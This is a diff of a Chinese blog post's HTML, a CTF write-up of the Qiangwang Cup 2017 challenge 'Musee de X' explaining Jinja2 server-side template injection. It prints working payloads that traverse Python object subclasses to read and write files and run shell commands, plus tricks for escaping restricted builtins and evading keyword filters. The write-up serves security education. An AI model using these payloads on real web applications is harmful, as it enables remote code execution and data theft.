@@ -1,6 +1,103 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>由Musee de X(强网杯2017)到jinja2模板注入 · damn1t</title><meta name="description" content="Musee de X(强网杯2017)学到新姿势
-分析注册admin之后进行登录，然后有一个捐赠页面，，网址随便填，这里有一点要注意，名字必须和登录名一致，否则会弹出：screw you hacker
-然后就成功的报错,查看报错信息:在/var/www/html/museum/view.py in "><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>由Musee de X(强网杯2017)到jinja2模板注入</a></h3></div><div class="post-content"><h1 id="Musee-de-X-强网杯2017"><a href="#Musee-de-X-强网杯2017" class="headerlink" title="Musee de X(强网杯2017)"></a>Musee de X(强网杯2017)</h1><p><strong>学到新姿势</strong></p>
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>由Musee de X(强网杯2017)到jinja2模板注入 · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">由Musee de X(强网杯2017)到jinja2模板注入</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2018-09-11</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Musee-de-X-强网杯2017"><a href="#Musee-de-X-强网杯2017" class="headerlink" title="Musee de X(强网杯2017)"></a>Musee de X(强网杯2017)</h1><p><strong>学到新姿势</strong></p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>注册admin之后进行登录，然后有一个捐赠页面，，网址随便填，这里有一点要注意，名字必须和登录名一致，否则会弹出：<strong>screw you hacker</strong></p>
 <p>然后就成功的报错,查看报错信息:<br>在<strong>/var/www/html/museum/view.py in makememe</strong>中有以下错误：</p>
 <pre><code>if &quot;http://&quot; in url:
@@ -9,7 +106,7 @@ image = urllib2.urlopen(url)
     url = &quot;http://&quot;+url
 image = urllib2.urlopen(url)
 except:
-  return HttpResponse(&quot;Error: couldn&apos;t get to that URL: &quot; + url + BACK)
+  return HttpResponse(&quot;Error: couldn&#39;t get to that URL: &quot; + url + BACK)
 if int(image.headers[&quot;Content-Length&quot;]) &gt; 1024*1024: ...
   return HttpResponse(&quot;File too large&quot;)
 fn = get_next_file(username)
@@ -23,10 +120,10 @@ add_text(fn,imghdr.what(fn),text)
 </blockquote>
 <p>可以知道将用户名当作文本信息发送，那么这里就存在注入点</p>
 <h2 id="关于模板注入"><a href="#关于模板注入" class="headerlink" title="关于模板注入"></a>关于模板注入</h2><p>重点要关注的是Template，官方教程给出如下说明：</p>
-<pre><code>`{% ... %}` for Statements
-`{{ ... }}` for Expressions to print to the template output
-`` for Comments not included in the template output
-`#  ... ##` for Line Statements
+<pre><code> `{% ... %}` for Statements
+ `{{ ... }}` for Expressions to print to the template output
+ `` for Comments not included in the template output
+ `#  ... ##` for Line Statements
 </code></pre><p>jinja2模板能访问一些python内置变量，如[],{}等，并且能够使用Python变量类型中的一些函数，这里要说明的一点是，如果要在jinja2中执行python代码，则要在模板环境中注册函数才能在模板中进行调用，具体可参考这篇文章：<br><a href="http://www.freebuf.com/articles/system/97146.html" target="_blank" rel="noopener">利用 Python 特性在 Jinja2 模板中执行任意代码</a></p>
 <p>于是给出payload：</p>
 <pre><code>abc{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
@@ -34,29 +131,29 @@ add_text(fn,imghdr.what(fn),text)
 <h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><h3 id="builtins模块"><a href="#builtins模块" class="headerlink" title="builtins模块"></a><strong>builtins</strong>模块</h3><p>builtins模块是python中的一个内建模块，如图：<br><img src="https://i.imgur.com/HoztRez.png" alt=""><br>该模块在Python启动后、且没有执行程序员所写的任何代码前，Python会首先加载 该内建函数到内存。另外，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀。<strong>但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即dict字典属性)中添加该功能。</strong></p>
 <h3 id="class-base-subclasses"><a href="#class-base-subclasses" class="headerlink" title="().class.base.subclasses()"></a>().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()</h3><p><img src="https://i.imgur.com/4D9ci7V.png" alt=""><br>为什么可以访问到所有模块呢？<br>当我们输入<code>().__class__</code>时，python显示为一个<strong>tuple</strong>类型，于是继续输入<code>().__class__.__base__</code>,访问类库，python显示为<strong>object</strong>类型，我们再继续访问，输入<code>().__class__.__base__.__subclasses__()</code>便得到了object的所有子类。于是接下来我们就可以访问对应的子类，由此便可能引发安全问题，例如<strong>file</strong>可以读取任意文件<br>除此之外还要提到的是，输入<code>().__class__.__mro__[1].__subclasses__()</code>也可以访问object的所有子类，这里要注意的是mro(Method Resolution Order)，关于多继承的问题，不再赘述</p>
 <p>示例利用代码：</p>
-<pre><code>//读文件
-().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read() 
-//写文件
-().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;) 
-//执行任意命令
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )
+<pre><code> //读文件
+ ().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read() 
+ //写文件
+ ().__class__.__bases__[0].__subclasses__()[40](&#39;/var/www/html/input&#39;, &#39;w&#39;).write(&#39;123&#39;) 
+ //执行任意命令
+ ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#39; )
 </code></pre><p>制作沙盒环境时，可能往往会删掉一些危险函数</p>
-<pre><code>del __builtins__.__dict__[&apos;__import__&apos;] # __import__ is the function called by the import statement
-del __builtins__.__dict__[&apos;eval&apos;] # evaluating code could be dangerous
-del __builtins__.__dict__[&apos;execfile&apos;] # likewise for executing the contents of a file
-del __builtins__.__dict__[&apos;input&apos;] # Getting user input and evaluating it might be dangerous
+<pre><code> del __builtins__.__dict__[&#39;__import__&#39;] # __import__ is the function called by the import statement
+ del __builtins__.__dict__[&#39;eval&#39;] # evaluating code could be dangerous
+ del __builtins__.__dict__[&#39;execfile&#39;] # likewise for executing the contents of a file
+ del __builtins__.__dict__[&#39;input&#39;] # Getting user input and evaluating it might be dangerous
 </code></pre><p>然而我们可以通过reload方法进行重载<br> <code>reload(__builtins__)</code></p>
 <p>还有一些情况是，程序员会进行一些关键词过滤，于是有几种思路是：</p>
 <ol>
 <li>利用python的base64等模块进行加密操作，然后再代码利用再进行一次解密操作<blockquote>
 <pre><code>&gt;&gt;import base64
-&gt;&gt;base64.b64encode(&apos;__import__&apos;)
-&apos;X19pbXBvcnRfXw==&apos;
-&gt;&gt;base64.b64encode(&apos;os&apos;)
-&apos;b3M=&apos; 
+&gt;&gt;base64.b64encode(&#39;__import__&#39;)
+&#39;X19pbXBvcnRfXw==&#39;
+&gt;&gt;base64.b64encode(&#39;os&#39;)
+&#39;b3M=&#39; 
 </code></pre></blockquote>
 </li>
 <li>拼接字符串:</li>
 </ol>
-<pre><code>[x for x in [].class.base.subclasses() if x.name == &apos;catch_warnings&apos;][0].init.func_globals[&apos;linecache&apos;].dict[&apos;o&apos;+&apos;s&apos;].dict[&apos;sy&apos;+&apos;stem&apos;](&apos;echo Hello SandBox&apos;)
-</code></pre></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2018-09-11</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2018/09/11/vulnerable/jinja2/,damn1t,由Musee de X(强网杯2017)到jinja2模板注入,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/03/18/OS/linux常见问题/" title="Linux常见错误">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2018/09/08/pwn/pwnable1/" title="pwnable.kr(1-2)">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+<pre><code>[x for x in [].class.base.subclasses() if x.name == &#39;catch_warnings&#39;][0].init.func_globals[&#39;linecache&#39;].dict[&#39;o&#39;+&#39;s&#39;].dict[&#39;sy&#39;+&#39;stem&#39;](&#39;echo Hello SandBox&#39;)
+</code></pre></article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2018/09/11/vulnerable/jinja2/">http://microvorld.com/2018/09/11/vulnerable/jinja2/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/03/18/OS/linux常见问题/" title="Linux常见错误"><span>< PreviousPost</span><br><span class="prevTitle">Linux常见错误</span></a><a class="nextSlogan" href="/2018/09/08/pwn/pwnable1/" title="pwnable.kr(1-2)"><span>NextPost ></span><br><span class="nextTitle">pwnable.kr(1-2)</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Musee-de-X-强网杯2017"><span class="toc-number">1.</span> <span class="toc-text">Musee de X(强网杯2017)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于模板注入"><span class="toc-number">1.2.</span> <span class="toc-text">关于模板注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重点"><span class="toc-number">1.3.</span> <span class="toc-text">重点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins模块"><span class="toc-number">1.3.1.</span> <span class="toc-text">builtins模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#class-base-subclasses"><span class="toc-number">1.3.2.</span> <span class="toc-text">().class.base.subclasses()</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
